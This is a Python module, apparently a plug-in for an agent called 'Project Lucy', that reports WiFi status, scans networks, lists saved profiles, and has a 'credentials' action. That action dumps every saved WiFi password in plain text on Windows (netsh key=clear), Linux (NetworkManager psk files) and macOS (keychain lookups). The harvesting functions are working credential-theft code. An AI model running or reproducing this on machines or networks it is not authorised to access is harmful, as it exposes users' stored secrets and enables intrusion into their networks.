"""
WiFi module for Project Lucy agent.
Actions: status, scan, profiles, credentials.
- status: report adapter state, connected SSID, interfaces
- scan: list visible WiFi networks
- profiles: list savedWiFi profiles
- credentials: extract saved WiFi passwords
"""
import platform
import subprocess

SYSTEM = platform.system()


def run(action: str = "scan", **kwargs) -> dict:
    if action == "scan":
        return _scan()
    elif action == "status":
        return _status()
    elif action == "profiles":
        return _profiles()
    elif action == "credentials":
        return _extract_credentials()
    return {"status": "failed", "data": None, "error": f"Unknown action: {action}"}


def _status() -> dict:
    """Report WiFi adapter state and connection info."""
    info = {"adapter_present": False, "connected": False, "ssid": None, "interfaces": []}
    try:
        if SYSTEM == "Windows":
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"],
                text=True, errors="replace", timeout=10
            )
            info["adapter_present"] = True
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("Name") and ":" in line:
                    info["interfaces"].append(line.split(":", 1)[-1].strip())
                elif line.startswith("SSID") and "BSSID" not in line:
                    ssid = line.split(":", 1)[-1].strip()
                    if ssid and ssid != "":
                        info["ssid"] = ssid
                        info["connected"] = True
                elif line.startswith("State") and ":" in line:
                    state = line.split(":", 1)[-1].strip().lower()
                    info["state"] = state
                    if "connected" in state:
                        info["connected"] = True
                elif line.startswith("Signal") and ":" in line:
                    info["signal"] = line.split(":", 1)[-1].strip()
                elif line.startswith("BSSID") and ":" in line:
                    info["bssid"] = line.split(":", 1)[-1].strip()
        elif SYSTEM == "Linux":
            try:
                out = subprocess.check_output(
                    ["nmcli", "-t", "-f", "DEVICE,TYPE,STATE,CONNECTION", "device"],
                    text=True, errors="replace", timeout=10
                )
                for line in out.splitlines():
                    parts = line.split(":")
                    if len(parts) >= 4 and "wifi" in parts[1].lower():
                        info["interfaces"].append(parts[0])
                        info["adapter_present"] = True
                        if "connected" in parts[2].lower():
                            info["connected"] = True
                            info["ssid"] = parts[3] if parts[3] else None
            except Exception:
                pass
        elif SYSTEM == "Darwin":
            try:
                out = subprocess.check_output(
                    ["networksetup", "-listallhardwareports"],
                    text=True, errors="replace", timeout=10
                )
                lines = out.splitlines()
                for i, line in enumerate(lines):
                    if "Wi-Fi" in line or "AirPort" in line:
                        info["adapter_present"] = True
                        if i + 2 < len(lines) and "Device:" in lines[i + 2]:
                            info["interfaces"].append(lines[i + 2].split(":", 1)[-1].strip())
                # Check connection
                out2 = subprocess.check_output(
                    ["networksetup", "-getairportnetwork", "en0"],
                    text=True, errors="replace", timeout=5
                )
                if "Current Wi-Fi Network:" in out2:
                    ssid = out2.split(":", 1)[-1].strip()
                    if ssid and ssid != "You are not associated with an AirPort network.":
                        info["ssid"] = ssid
                        info["connected"] = True
            except Exception:
                pass
        return {"status": "completed", "data": info}
    except subprocess.CalledProcessError:
        # netsh wlan show interfaces fails if WLAN AutoConfig service is not running
        info["message"] = "WLAN AutoConfig service may not be running"
        return {"status": "completed", "data": info}
    except Exception as exc:
        info["message"] = f"WiFi status check failed: {exc}"
        return {"status": "completed", "data": info}


def _scan() -> dict:
    """List visible WiFi networks."""
    networks = []
    adapter_present = _check_adapter_present()
    try:
        if SYSTEM == "Windows":
            # Try with BSSID mode first, fall back to simple mode
            out = None
            try:
                out = subprocess.check_output(
                    ["netsh", "wlan", "show", "networks", "mode=bssid"],
                    text=True, errors="replace", timeout=10
                )
            except subprocess.CalledProcessError:
                try:
                    out = subprocess.check_output(
                        ["netsh", "wlan", "show", "networks"],
                        text=True, errors="replace", timeout=10
                    )
                except subprocess.CalledProcessError:
                    out = ""
            if out:
                ssid = None
                for line in out.splitlines():
                    line = line.strip()
                    if line.startswith("SSID") and "BSSID" not in line:
                        ssid = line.split(":", 1)[-1].strip()
                    elif line.startswith("Signal") and ssid:
                        signal = line.split(":", 1)[-1].strip()
                        networks.append({"ssid": ssid, "signal": signal})
                        ssid = None
        elif SYSTEM == "Linux":
            out = subprocess.check_output(
                ["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi", "list"],
                text=True, errors="replace", timeout=10
            )
            for line in out.splitlines():
                parts = line.split(":")
                if len(parts) >= 2:
                    networks.append({"ssid": parts[0], "signal": parts[1], "security": parts[2] if len(parts) > 2 else ""})
        elif SYSTEM == "Darwin":
            out = subprocess.check_output(
                ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"],
                text=True, errors="replace", timeout=10
            )
            lines = out.strip().splitlines()
            for line in lines[1:]:
                parts = line.split()
                if parts:
                    networks.append({"ssid": parts[0], "signal": parts[1] if len(parts) > 1 else ""})
        return {"status": "completed", "data": {"networks": networks, "count": len(networks), "adapter_present": adapter_present}}
    except subprocess.CalledProcessError:
        msg = "No WiFi adapter available" if not adapter_present else "Adapter present but scan returned no visible networks (adapter may be connected but not scanning)"
        return {"status": "completed", "data": {"networks": [], "count": 0, "adapter_present": adapter_present, "message": msg}}
    except Exception as exc:
        return {"status": "completed", "data": {"networks": [], "count": 0, "adapter_present": adapter_present, "message": f"WiFi scan skipped: {exc}"}}


def _check_adapter_present() -> bool:
    """Quick check if a WiFi adapter exists on the system."""
    try:
        if SYSTEM == "Windows":
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"],
                text=True, errors="replace", timeout=5, stderr=subprocess.DEVNULL
            )
            return bool(out.strip())
        elif SYSTEM == "Linux":
            out = subprocess.check_output(
                ["nmcli", "-t", "-f", "TYPE", "device"],
                text=True, errors="replace", timeout=5, stderr=subprocess.DEVNULL
            )
            return "wifi" in out.lower()
        elif SYSTEM == "Darwin":
            out = subprocess.check_output(
                ["networksetup", "-listallhardwareports"],
                text=True, errors="replace", timeout=5, stderr=subprocess.DEVNULL
            )
            return "Wi-Fi" in out or "AirPort" in out
    except Exception:
        return False
    return False


def _profiles() -> dict:
    """List saved WiFi profiles (names only, no passwords)."""
    profiles = []
    try:
        if SYSTEM == "Windows":
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                text=True, errors="replace", timeout=10
            )
            for line in out.splitlines():
                if "All User Profile" in line:
                    profiles.append({"ssid": line.split(":", 1)[-1].strip()})
        elif SYSTEM == "Linux":
            out = subprocess.check_output(
                ["nmcli", "-t", "-f", "NAME,TYPE", "connection", "show"],
                text=True, errors="replace", timeout=10
            )
            for line in out.splitlines():
                parts = line.split(":")
                if len(parts) >= 2 and "wifi" in parts[1].lower():
                    profiles.append({"ssid": parts[0]})
        elif SYSTEM == "Darwin":
            out = subprocess.check_output(
                ["networksetup", "-listpreferredwirelessnetworks", "en0"],
                text=True, errors="replace", timeout=10
            )
            for line in out.splitlines()[1:]:
                ssid = line.strip()
                if ssid:
                    profiles.append({"ssid": ssid})
        return {"status": "completed", "data": {"profiles": profiles, "count": len(profiles)}}
    except Exception as exc:
        return {"status": "completed", "data": {"profiles": [], "count": 0, "message": f"WiFi profiles skipped: {exc}"}}


def _extract_credentials() -> dict:
    """Extract saved WiFi passwords."""
    credentials = []

    try:
        if SYSTEM == "Windows":
            credentials = _win_credentials()
        elif SYSTEM == "Linux":
            credentials = _linux_credentials()
        elif SYSTEM == "Darwin":
            credentials = _mac_credentials()
        return {"status": "completed", "data": {"credentials": credentials, "count": len(credentials)}}
    except Exception as exc:
        return {"status": "completed", "data": {"credentials": [], "count": 0, "message": f"WiFi credentials skipped: {exc}"}}


def _win_credentials() -> list[dict]:
    results = []
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            text=True, errors="replace", timeout=10
        )
        profiles = [
            line.split(":", 1)[-1].strip()
            for line in out.splitlines()
            if "All User Profile" in line
        ]
        for profile in profiles:
            try:
                detail = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                    text=True, errors="replace", timeout=5
                )
                password = ""
                for line in detail.splitlines():
                    if "Key Content" in line:
                        password = line.split(":", 1)[-1].strip()
                        break
                results.append({"ssid": profile, "password": password})
            except Exception:
                results.append({"ssid": profile, "password": "(error)"})
    except Exception as exc:
        pass
    return results


def _linux_credentials() -> list[dict]:
    import os
    results = []
    nm_path = "/etc/NetworkManager/system-connections/"
    if not os.path.exists(nm_path):
        return results
    for fname in os.listdir(nm_path):
        fpath = os.path.join(nm_path, fname)
        try:
            content = open(fpath, errors="replace").read()
            ssid = ""
            password = ""
            for line in content.splitlines():
                if line.startswith("ssid="):
                    ssid = line.split("=", 1)[-1]
                elif line.startswith("psk="):
                    password = line.split("=", 1)[-1]
            if ssid:
                results.append({"ssid": ssid, "password": password})
        except Exception:
            pass
    return results


def _mac_credentials() -> list[dict]:
    results = []
    try:
        out = subprocess.check_output(
            ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"],
            text=True, errors="replace", timeout=10
        )
        lines = out.strip().splitlines()
        for line in lines[1:]:
            parts = line.split()
            if not parts:
                continue
            ssid = parts[0]
            try:
                pw_out = subprocess.check_output(
                    ["security", "find-generic-password", "-D", "AirPort network password", "-a", ssid, "-w"],
                    text=True, errors="replace", timeout=5, stderr=subprocess.DEVNULL
                )
                results.append({"ssid": ssid, "password": pw_out.strip()})
            except Exception:
                results.append({"ssid": ssid, "password": ""})
    except Exception:
        pass
    return results
